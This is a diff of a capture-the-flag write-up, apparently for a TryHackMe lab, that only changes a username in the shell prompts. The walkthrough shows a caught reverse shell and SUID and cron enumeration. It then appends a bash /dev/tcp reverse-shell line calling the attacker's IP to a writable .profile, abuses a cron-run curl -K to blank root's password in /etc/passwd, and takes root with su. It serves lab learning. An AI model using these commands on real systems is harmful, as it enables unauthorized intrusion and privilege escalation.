@@ -487,7 +487,7 @@ listening on [any] 4444 ...
 connect to [10.9.63.75] from (UNKNOWN) [10.10.17.241] 54388
 bash: cannot set terminal process group (14): Inappropriate ioctl for device
 bash: no job control in this shell
-[REDACTED]@482cbf2305ae:/app$ whoami;id;pwd;ls -la
+ayham@482cbf2305ae:/app$ whoami;id;pwd;ls -la
 whoami;id;pwd;ls -la
 [REDACTED]
 uid=1000([REDACTED]) gid=1000([REDACTED]) groups=1000([REDACTED])
@@ -508,29 +508,29 @@ drwxr-xr-x 2 root root 4096 Apr  2  2023 templates
 Navigate to the current user’s directory and get the first flag:
 
 ```
-[REDACTED]@482cbf2305ae:/app$ cd
+ayham@482cbf2305ae:/app$ cd
 cd
-[REDACTED]@482cbf2305ae:~$ ls -l
+ayham@482cbf2305ae:~$ ls -l
 ls -l
 total 4
 -rw-r--r-- 1 root root 32 Apr  2  2023 flag1.txt
-[REDACTED]@482cbf2305ae:~$ cat flag1.txt
+ayham@482cbf2305ae:~$ cat flag1.txt
 THM{[REDACTED]}
 ```
 
 ### Horizontal Privilege Escalation
 
 ```
-[REDACTED]@482cbf2305ae:~$ cd ..
+ayham@482cbf2305ae:~$ cd ..
 cd ..
-[REDACTED]@482cbf2305ae:/home$ ls -l
+ayham@482cbf2305ae:/home$ ls -l
 ls -l
 total 8
 drwxr-xr-x 1 F30s  F30s  4096 Jun 24  2023 F30s
 drwxr-xr-x 1 [REDACTED] [REDACTED] 4096 Jun 24  2023 [REDACTED]
-[REDACTED]@482cbf2305ae:/home$ cd F30s
+ayham@482cbf2305ae:/home$ cd F30s
 cd F30s
-[REDACTED]@482cbf2305ae:/home/F30s$ ls -la
+ayham@482cbf2305ae:/home/F30s$ ls -la
 ls -la
 total 32
 drwxr-xr-x 1 F30s F30s 4096 Jun 24  2023 .
@@ -540,7 +540,7 @@ drwxr-xr-x 1 root root 4096 Jun 24  2023 ..
 -rw-r--rw- 1 F30s F30s  807 Mar 27  2022 .profile
 -rw-r--r-- 1 root root   17 May 19  2023 health_check
 -rw-r----- 1 F30s F30s   38 May 22  2023 site_check
-[REDACTED]@482cbf2305ae:/home/F30s$ file *
+ayham@482cbf2305ae:/home/F30s$ file *
 file *
 health_check: ASCII text
 site_check:   regular file, no read permission
@@ -549,9 +549,9 @@ site_check:   regular file, no read permission
 Navigate to the root `/` directory and I explore a `.txt` file:
 
 ```
-[REDACTED]@482cbf2305ae:/home/F30s$ cd /
+ayham@482cbf2305ae:/home/F30s$ cd /
 cd /
-[REDACTED]@482cbf2305ae:/$ ls -la
+ayham@482cbf2305ae:/$ ls -la
 ls -la
 total 88
 drwxr-xr-x   1 root root 4096 Jun 24  2023 .
@@ -594,7 +594,7 @@ Ok, the note is trying to say that there are 2 missing of something and some oth
 Finding **SUID** files set permission, I explore the `exim4` is interesting:
 
 ```
-[REDACTED]@482cbf2305ae:/$ find / -type f -perm -04000 2>/dev/null
+ayham@482cbf2305ae:/$ find / -type f -perm -04000 2>/dev/null
 find / -type f -perm -04000 2>/dev/null
 /bin/mount
 /bin/su
@@ -606,7 +606,7 @@ find / -type f -perm -04000 2>/dev/null
 /usr/bin/passwd
 /usr/sbin/exim4
 /usr/lib/openssh/ssh-keysign
-[REDACTED]@482cbf2305ae:/$ ls -l /usr/sbin/exim4
+ayham@482cbf2305ae:/$ ls -l /usr/sbin/exim4
 ls -l /usr/sbin/exim4
 -rwsr-xr-x 1 root root 1360680 Jul 13  2021 /usr/sbin/exim4
 ```
@@ -614,7 +614,7 @@ ls -l /usr/sbin/exim4
 Unfortunately, checking it version make me realize that it is not too old to be exploit:
 
 ```
-[REDACTED]@482cbf2305ae:/tmp$ /usr/sbin/exim4 --version
+ayham@482cbf2305ae:/tmp$ /usr/sbin/exim4 --version
 /usr/sbin/exim4 --version
 Exim version 4.94.2 #2 built 13-Jul-2021 16:04:57
 Copyright (c) University of Cambridge, 1995 - 2018
@@ -624,7 +624,7 @@ Copyright (c) University of Cambridge, 1995 - 2018
 Then I move on to the cronjobs and this is what the vulnerabilities occur:
 
 ```
-[REDACTED]@482cbf2305ae:/$ cat /etc/crontab
+ayham@482cbf2305ae:/$ cat /etc/crontab
 cat /etc/crontab
 # /etc/crontab: system-wide crontab
 # Unlike any other crontab you don't have to run the `crontab'
@@ -656,7 +656,7 @@ The crontab of user `F30s` would run a Bash command every minute, which reads an
 The `health_check` is just a simple TXT file and does not contain any sensitive information
 
 ```
-[REDACTED]@482cbf2305ae:/$ cat /home/F30s/health_check
+ayham@482cbf2305ae:/$ cat /home/F30s/health_check
 cat /home/F30s/health_check
 Health: 1337/100
 ```
@@ -666,7 +666,7 @@ But here is the point: `-l`. The `-l` option stands for the “login shell” wh
 Verify that the `.profile` inside `F30s` user’s environment is able to be modified:
 
 ```
-[REDACTED]@482cbf2305ae:/home/F30s$ ls -la
+ayham@482cbf2305ae:/home/F30s$ ls -la
 ls -la
 total 32
 drwxr-xr-x 1 F30s F30s 4096 Jun 24  2023 .
@@ -679,9 +679,9 @@ drwxr-xr-x 1 root root 4096 Jun 24  2023 ..
 ```
 
 ```
-[REDACTED]@482cbf2305ae:/home/F30s$ echo "bash -i >& /dev/tcp/10.9.63.75/4443 0>&1" >> /home/F30s/.profile
+ayham@482cbf2305ae:/home/F30s$ echo "bash -i >& /dev/tcp/10.9.63.75/4443 0>&1" >> /home/F30s/.profile
 <ev/tcp/10.9.63.75/4443 0>&1" >> /home/F30s/.profile
-[REDACTED]@482cbf2305ae:/home/F30s$ tail .profile
+ayham@482cbf2305ae:/home/F30s$ tail .profile
 tail .profile
 if [ -d "$HOME/bin" ] ; then
     PATH="$HOME/bin:$PATH"
@@ -759,7 +759,7 @@ Then wait for a minute and re-check the `/etc/passwd` on the target system, the 
 Original
 
 ```
-[REDACTED]@482cbf2305ae:/home/F30s$ cat /etc/passwd
+ayham@482cbf2305ae:/home/F30s$ cat /etc/passwd
 cat /etc/passwd
 root:x:0:0:root:/root:/bin/bash
 daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
@@ -788,7 +788,7 @@ F30s:x:1001:1001::/home/F30s:/bin/bash
 After the `curl -K /home/F30s/site_check` is auto executed by the cronjobs
 
 ```
-[REDACTED]@482cbf2305ae:/home/F30s$ cat /etc/passwd
+ayham@482cbf2305ae:/home/F30s$ cat /etc/passwd
 cat /etc/passwd
 daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
 bin:x:2:2:bin:/bin:/usr/sbin/nologin
@@ -817,7 +817,7 @@ root::0:0:root:/root:/bin/sh
 Now I simply type `su root` without any password required and become root user:
 
 ```
-[REDACTED]@482cbf2305ae:/home/F30s$ su root
+ayham@482cbf2305ae:/home/F30s$ su root
 su root
 whoami;id;pwd
 root
